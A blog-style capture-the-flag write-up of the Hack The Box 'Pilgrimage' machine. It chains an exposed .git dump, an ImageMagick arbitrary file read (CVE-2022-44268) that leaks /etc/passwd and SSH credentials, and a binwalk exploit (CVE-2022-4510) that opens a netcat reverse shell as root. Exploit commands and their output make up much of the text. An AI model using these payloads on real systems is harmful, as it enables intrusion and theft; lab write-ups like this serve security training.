---
layout: post
title: Hack The Box - Pilgrimage
date: 2023-08-01 22:02 +0200
image:
    path: /assets/img/posts/pilgrimage/pilgrimage-card.png
    alt: Pilgrimage card
categories: [HackTheBox]
tags: [Hack-The-Box-Easy, Remote Arbitrary Leak, Remote Command Execution]
---

```
HOST: 10.10.11.219
```

## Tools used

-   [nmap](https://nmap.org/)

## Enumeration

### Nmap Scan

```bash
┌──(rether㉿rether)
└─$ nmap 10.10.11.219 -Pn -A
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 22:11 CEST
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-git:
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
|_http-title: Pilgrimage - Shrink Your Images
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reveals that there is a Git repository accessible on the web server at `10.10.11.219/.git/`:

```bash
| http-git:
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
```

### Git repository

With this tools [git-dumper](https://github.com/arthaud/git-dumper) we can get the files from the repository (don't forget to add pulgrimage.htb to the host file).

```bash
git-dumper http://pilgrimage.htb/.git/ pilgrimage-git
```

And we get this result:

```bash
┌──(rether㉿rether)
└─$ ls -al pilgrimage-git
total 26972
drwxr-xr-x 5 rether rether     4096 Aug  2 12:49 .
drwxr-xr-x 3 rether rether     4096 Aug  2 12:49 ..
drwxr-xr-x 6 rether rether     4096 Aug  2 12:49 assets
-rwxr-xr-x 1 rether rether     5538 Aug  2 12:49 dashboard.php
drwxr-xr-x 7 rether rether     4096 Aug  2 12:49 .git
-rwxr-xr-x 1 rether rether     9250 Aug  2 12:49 index.php
-rwxr-xr-x 1 rether rether     6822 Aug  2 12:49 login.php
-rwxr-xr-x 1 rether rether       98 Aug  2 12:49 logout.php
-rwxr-xr-x 1 rether rether 27555008 Aug  2 12:49 magick
-rwxr-xr-x 1 rether rether     6836 Aug  2 12:49 register.php
drwxr-xr-x 4 rether rether     4096 Aug  2 12:49 vendor
```

Look a the file magick, with the file command we are enable to tell is a 64-bit ELF executable.

```bash
┌──(rether㉿rether)
└─$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

**_ImageMagick is a free and open-source software suite that allows users to create, edit, convert, and manipulate images in various formats. It provides a command-line interface (CLI) as well as libraries and APIs for programming languages, making it a versatile tool for image processing and manipulation tasks._**

The version of ImageMagick is 7.1.0-49. During our research, we discovered that this version is vulnerable to a remote arbitrary leak. This vulnerability makes it possible to read files that should not be accessible. We found this [script](https://github.com/Sybil-Scan/imagemagick-lfi-poc) on github, which generates an image with the path to the file we want to read.

### ImageMagick - Arbitrary File Read (CVE-2022-44268)

To check whether this vulnerability works, let's see if we can read the contents of the `/etc/passwd` file.

Using the script above, we'll generate an image:

```bash
python3 generate.py -f "/etc/passwd" -o exploit.png
```

Then we can upload the image to this [website](http://pilgrimage.htb/), running on the machine at port 80. And download the image via the link shrunk given by the site
Then use the `identify` command to extract image information

```bash
identify -verbose 64d61e683552e.png
```

In the image properties we see the metadata from the image

```text
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
```

By running the command above we can transform this hex to ascii characters:

```bash
echo "hex-char" | xxd -r -p
```

And then we got this result:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

We have successfully read the /etc/passwd. And with this file, we are able to find a user: `emily`.
But now we need the ssh credentials to access the machine.

## Get user flag

In the login.php file from the git repository we found this line:

```php
$db = new PDO('sqlite:/var/db/pilgrimage');
```

This line initalizes a connection to an SQLite database located at `/var/db/pilgrimage`.
Using the same method as above, we can read this:

```bash
python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
```

By decoding the metadata we find in this file the ssh credentails connection for emily

```bash
abig[...]i123
```

So we are able to get the user flag.

```bash
┌──(rether㉿rether)
└─$ ssh emily@10.10.11.219
emily@10.10.11.219's password:
[...]
emily@pilgrimage:~$ cat user.txt
[user-flag]
```

## Enumeration (for root flag)

In the background work we see this two lines:

```
root         778  0.0  0.0   2516   780 ?        S    00:14   0:00 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root         779  0.0  0.0   6816  2352 ?        S    00:14   0:00 /bin/bash /usr/sbin/malwarescan.sh
```

The `malwarescan.sh` script was below:

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
	for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```

In summary, this script uses `inotifywait` to monitor a directory for newly created files, then runs `binwalk` on these files to extract embedded data and checks whether any of the specified keywords from the `blacklist` array are present in the extracted data. If a keyword is found, the script deletes the file. This script is designed to prevent the creation or storage of files that contain certain sensitive keywords, possibly as a security measure.

This script use binwalk v2.3.2:

```bash
emily@pilgrimage:~$ binwalk

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk
```

By digging a little we found this [exploit](https://www.exploit-db.com/exploits/51249).

### Remote Command Execution (RCE) - CVE-2022-4510

```bash
┌──(rether㉿rether)
└─$ python3 exploit.py exploit.png <YOUR-IP> 443
```

Create HTTP server

```bash
python3 -m http.server 80
```

Go in the folder below

```bash
cd /var/www/pilgrimage.htb/shrunk
```

Create netcat server

```bash
nc -lnvp 443
```

Then use wget to request HTTP server

```bash
wget http://<YOUR-IP>/binwalk_exploit.png
```

And read the following url to trigger the payload : <http://pilgrimage.htb/shrunk/binwalk_exploit.png>

```bash
┌──(rether㉿rether)-[~]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.219] 53796
whoami
root
```

And then we can get the root flag

```bash
cat /root/root.txt
[root-flag]
```

![Pilgrimage pwned card](/assets/img/posts/pilgrimage/pilgrimage-pwned-card.png "Pilgrimage pwned card")
